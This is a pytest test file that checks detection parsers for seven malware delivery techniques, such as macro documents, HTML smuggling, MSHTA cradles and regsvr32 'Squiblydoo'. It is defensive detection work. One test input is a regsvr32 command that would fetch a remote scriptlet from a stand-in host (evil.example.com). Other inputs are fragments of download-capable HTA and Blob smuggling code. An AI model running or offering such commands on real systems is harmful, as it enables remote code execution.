"""
test_60_mwcp_delivery_parsers.py -- Validation for the 7 Tier 2 delivery
mechanism mwcp parsers (initial-access documents / containers / scripts).

Every identify() here requires 2+ independent structural/behavioral signals
-- never a single indicator alone -- per [[feedback-detection-design]]:
a single flag/string is not evidence on its own across a large search space
or a common string; only a genuine cluster is.
"""

import importlib
import json
import os
import subprocess
import sys

import pytest

_HERE       = os.path.dirname(os.path.abspath(__file__))
_ROOT       = os.path.dirname(_HERE)
_WIN_HUNT   = os.path.join(_ROOT, 'playbooks', 'windows', 'threat_hunting')
_PARSERS    = os.path.join(_WIN_HUNT, 'mwcp_parsers')
_MWCP_SCAN  = os.path.join(_WIN_HUNT, 'mwcp_scan.py')
_MWCP_LIB   = os.path.join(_ROOT, 'tools', 'mwcp', 'lib')
_LAB        = os.path.join(_HERE, 'windows', 'lab_mwcp')
_GENERATE   = os.path.join(_LAB, 'generate_samples.py')
_TP         = os.path.join(_LAB, 'samples', 'tp')
_FP         = os.path.join(_LAB, 'samples', 'fp')

_mwcp_ok = False
if os.path.isdir(_MWCP_LIB):
    for _p in (_MWCP_LIB, _PARSERS):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    try:
        import mwcp  # noqa: F401
        _mwcp_ok = True
    except ImportError:
        pass

needs_mwcp = pytest.mark.skipif(not _mwcp_ok, reason='mwcp not staged in tools/')


@pytest.fixture(scope='session', autouse=True)
def lab_samples():
    tp_probe = os.path.join(_TP, 'macro_downloader.doc')
    if not os.path.exists(tp_probe):
        subprocess.run([sys.executable, _GENERATE], check=True, timeout=30)


class _FO:
    def __init__(self, data: bytes):
        self.data = data
        self.name = 'test.bin'


def _tp_bytes(filename: str) -> bytes:
    with open(os.path.join(_TP, filename), 'rb') as f:
        return f.read()


def _all_fp_bytes() -> list[tuple[str, bytes]]:
    out = []
    for fname in sorted(os.listdir(_FP)):
        with open(os.path.join(_FP, fname), 'rb') as f:
            out.append((fname, f.read()))
    return out


def _run_mwcp(file_path: str, timeout: int = 60) -> dict:
    r = subprocess.run(
        [sys.executable, _MWCP_SCAN, _MWCP_LIB, '-', file_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout,
    )
    stdout = r.stdout.decode('utf-8', errors='replace') if r.stdout else ''
    if not stdout.strip():
        pytest.fail(f'mwcp_scan returned no output for {os.path.basename(file_path)}: '
                    f'rc={r.returncode} stderr={r.stderr.decode("utf-8","replace")[:400]!r}')
    results = json.loads(stdout)
    return results[0] if results else {}


def _has_ioc(result: dict) -> bool:
    return bool(result.get('address') or result.get('mutex') or
                result.get('password') or result.get('decoded'))


_PARSER_TP_FILE = [
    ('delivery.MacroExtractor',         'MacroExtractor',         'macro_downloader.doc'),
    ('delivery.ISOLNKChain',            'ISOLNKChain',            'iso_lnk_chain.iso'),
    ('delivery.HTMLSmugglingDetector',  'HTMLSmugglingDetector',  'html_smuggling.html'),
    ('delivery.OneNoteEmbedDetector',   'OneNoteEmbedDetector',   'onenote_embed.one'),
    ('delivery.MSHTAConfig',            'MSHTAConfig',            'mshta_cradle.hta'),
    ('delivery.WSFPolyglotConfig',      'WSFPolyglotConfig',      'wsf_polyglot.wsf'),
    ('delivery.RegSvrConfig',           'RegSvrConfig',           'regsvr_squiblydoo.txt'),
]


@needs_mwcp
class TestDeliveryIdentifyTP:
    @pytest.mark.parametrize('module_path,parser_name,tp_file', _PARSER_TP_FILE)
    def test_identifies_own_tp_sample(self, module_path, parser_name, tp_file, lab_samples):
        mod = importlib.import_module(module_path)
        cls = getattr(mod, parser_name)
        assert cls.identify(_FO(_tp_bytes(tp_file))) is True, \
            f'{parser_name} failed to identify its own TP sample ({tp_file})'


@needs_mwcp
class TestDeliveryNoFalsePositives:
    @pytest.mark.parametrize('module_path,parser_name,_', _PARSER_TP_FILE)
    def test_silent_on_all_fp_samples(self, module_path, parser_name, _, lab_samples):
        mod = importlib.import_module(module_path)
        cls = getattr(mod, parser_name)
        fires_on = []
        for fname, data in _all_fp_bytes():
            try:
                if cls.identify(_FO(data)):
                    fires_on.append(fname)
            except Exception as e:
                fires_on.append(f'{fname} (EXCEPTION: {e})')
        assert not fires_on, f'{parser_name} incorrectly fired on FP sample(s): {fires_on}'


@needs_mwcp
class TestDeliverySingleIndicatorNotEnough:
    """Each parser must require its documented pair of signals -- a lone
    signal (one API call, one container magic, one flag) must not fire."""

    def test_macro_extractor_needs_autoexec_and_declare(self):
        from delivery.MacroExtractor import MacroExtractor
        # Auto-exec entry point alone, no Win32 API Declare statement
        data = b'Sub Document_Open()\n  MsgBox "hi"\nEnd Sub\n'
        assert MacroExtractor.identify(_FO(data)) is False

    def test_iso_lnk_chain_needs_pvd_and_lnk(self):
        from delivery.ISOLNKChain import ISOLNKChain
        # ISO9660 PVD signature alone, no embedded LNK structure
        data = bytearray(b'\x00' * 40000)
        data[32769:32774] = b'CD001'
        assert ISOLNKChain.identify(_FO(bytes(data))) is False

    def test_html_smuggling_needs_blob_api_and_large_b64(self):
        from delivery.HTMLSmugglingDetector import HTMLSmugglingDetector
        # Blob API call alone, no payload-sized base64 blob
        data = b'<script>new Blob([1,2,3]); msSaveOrOpenBlob(x,"y");</script>'
        assert HTMLSmugglingDetector.identify(_FO(data)) is False

    def test_onenote_embed_needs_header_and_fds_with_exe_ext(self):
        from delivery.OneNoteEmbedDetector import OneNoteEmbedDetector
        # OneNote file header alone, no embedded executable-shaped attachment
        one_header = bytes([0xE4, 0x52, 0x5C, 0x7B, 0x8C, 0xD8, 0xA7, 0x4D,
                             0xAE, 0xB1, 0x53, 0x78, 0xD0, 0x29, 0x96, 0xD3])
        data = one_header + b'\x00' * 100
        assert OneNoteEmbedDetector.identify(_FO(data)) is False

    def test_mshta_needs_com_object_and_url(self):
        from delivery.MSHTAConfig import MSHTAConfig
        # Network COM ProgID alone, no URL literal
        data = b'<hta:application id="x"/><script>var x=CreateObject("Msxml2.XMLHTTP");</script>'
        assert MSHTAConfig.identify(_FO(data)) is False

    def test_wsf_polyglot_needs_multilang_and_primitive(self):
        from delivery.WSFPolyglotConfig import WSFPolyglotConfig
        # Two script languages alone, no download/execute-capable COM object
        data = b'<job><script language="VBScript">x=1</script><script language="JScript">y=2</script></job>'
        assert WSFPolyglotConfig.identify(_FO(data)) is False

    def test_regsvr_needs_i_url_and_scrobj(self):
        from delivery.RegSvrConfig import RegSvrConfig
        # /i: URL flag alone, no scrobj.dll reference
        data = b'regsvr32.exe /s /n /i:http://evil.example.com/x.sct other.dll'
        assert RegSvrConfig.identify(_FO(data)) is False


@pytest.mark.skipif(not (os.path.isfile(_MWCP_SCAN) and _mwcp_ok),
                    reason='mwcp_scan.py or mwcp not available')
class TestDeliveryEndToEnd:

    @pytest.mark.parametrize('parser_name,tp_file,expect_substr', [
        ('MacroExtractor',        'macro_downloader.doc',  'MacroDownloader'),
        ('ISOLNKChain',           'iso_lnk_chain.iso',     'ISO-LNK-Chain'),
        ('HTMLSmugglingDetector', 'html_smuggling.html',   'HTML-Smuggling'),
        ('OneNoteEmbedDetector',  'onenote_embed.one',     'OneNote-EmbeddedExecutable'),
        ('MSHTAConfig',           'mshta_cradle.hta',      'MSHTA-Cradle'),
        ('WSFPolyglotConfig',     'wsf_polyglot.wsf',      'WSF-Polyglot'),
        ('RegSvrConfig',          'regsvr_squiblydoo.txt', 'Squiblydoo'),
    ])
    def test_extracts_via_mwcp_scan(self, parser_name, tp_file, expect_substr, lab_samples):
        r = _run_mwcp(os.path.join(_TP, tp_file))
        assert _has_ioc(r), f'{parser_name} produced no IOC: {r}'
        decoded = ' '.join(r.get('decoded', []))
        assert expect_substr in decoded, f'{parser_name}: expected {expect_substr!r} in {decoded!r}'


@pytest.mark.skipif(not (os.path.isfile(_MWCP_SCAN) and _mwcp_ok),
                    reason='mwcp_scan.py or mwcp not available')
class TestDeliveryEndToEndFP:
    @pytest.mark.parametrize('fp_file', [
        'benign_pe.bin', 'benign_ps1.ps1', 'benign_macro.vbs', 'benign_binary.bin',
        'regsvr_local_dll.txt', 'html_small_image.html',
    ])
    def test_no_ioc_from_fp_sample(self, fp_file, lab_samples):
        r = _run_mwcp(os.path.join(_FP, fp_file))
        assert not _has_ioc(r), f'{fp_file} unexpectedly produced an IOC: {r}'
